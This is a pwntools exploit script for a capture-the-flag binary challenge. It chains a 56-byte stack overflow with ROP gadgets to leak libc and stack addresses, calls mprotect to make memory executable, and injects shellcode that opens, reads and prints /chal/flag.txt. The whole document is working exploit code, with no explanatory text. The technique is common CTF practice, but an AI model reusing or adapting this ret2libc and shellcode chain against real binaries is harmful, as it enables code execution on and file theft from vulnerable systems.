from pwn import *

context.update(arch='amd64', os='linux')
context.terminal = ['iterm2', 'new-window']

HOST, PORT = 'chal.duc.tf', 30006
BINARY = './return-to-whats-revenge'
LIBC = './libc6_2.27-3ubuntu1_amd64.so'
# LIBC ='./libc.so'

elf  = ELF(BINARY)
libc = ELF(LIBC)

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = remote('127.0.0.1',9997)



rop = ROP(elf)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
libc_start_main = elf.symbols['__libc_start_main']
main = elf.symbols['main']
pop_rdi = (rop.find_gadget(['pop rdi','ret']))[0]
ret =  (rop.find_gadget(['ret']))[0]


#leak libc step 2
payload = 'A'*56
payload += p64(pop_rdi)
# payload += p64(libc_start_main)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.recv()
p.sendline(payload)
puts = u64(p.recv().split('\n')[0].ljust(8,'\x00'))
info('puts %s',hex(puts))
libc.address = puts-libc.symbols['puts'] #local
info('libc %s',hex(libc.address))
binsh = next(libc.search("/bin/sh"))
info('binsh %s',hex(binsh))
system = libc.sym["system"]
info('system %s',hex(system))


payload = 'A'*56
payload += p64(pop_rdi)
payload += p64(libc.sym['environ'])
payload += p64(puts_plt)
payload += p64(main)

p.sendline(payload)

stack_leak = u64(p.recv().split('\n')[0].ljust(8,'\x00'))
info('stack leak %s', hex(stack_leak))
#open,read,write,mprotect,brk
msrk = 0x000000000404010
addr_mprotect = msrk-(msrk % 4096)
mprotect = libc.sym['mprotect']
rop_libc = ROP(libc)
pop_rdx_rsi = (rop_libc.find_gadget(['pop rdx','pop rsi','ret']))[0]
read = libc.sym['read']

payload = 'A'*56
payload += p64(pop_rdi) #addr
payload += p64(addr_mprotect) 
payload += p64(pop_rdx_rsi) 
payload += p64(0x7) #rwx
payload += p64(0x1000) #len
payload += p64(mprotect) #retu to mprotect
payload += p64(main)


p.sendline(payload)
p.recv()
info('mprotect done')
#write shell code to the address 

asm = asm('''
    /* open(file='/chal/flag.txt', oflag=0, mode=0) */
    /* push b'/chal/flag.txt\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x7478742e6761
    xor [rsp], rax
    mov rax, 0x6c662f6c6168632f
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall

    /* Save file descriptor for later */
    mov rbx, rax

       /* call read('ebx', 'rsp', 30) */
    xor eax, eax /* SYS_read */
    mov edi, ebx
    push 0x1e
    pop rdx
    mov rsi, rsp
    syscall

        /* write(fd=0, buf='rsp', n=30) */
    xor edi, edi /* 0 */
    push 0x1e
    pop rdx
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
''')

payload = 'A'*56
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rdx_rsi)
payload += p64(len(asm)+0x10)
payload += p64(addr_mprotect)
payload += p64(read)
payload += p64(addr_mprotect)

p.sendline(payload)
info('reading shellcode ')
p.sendline(asm)

p.interactive()


	

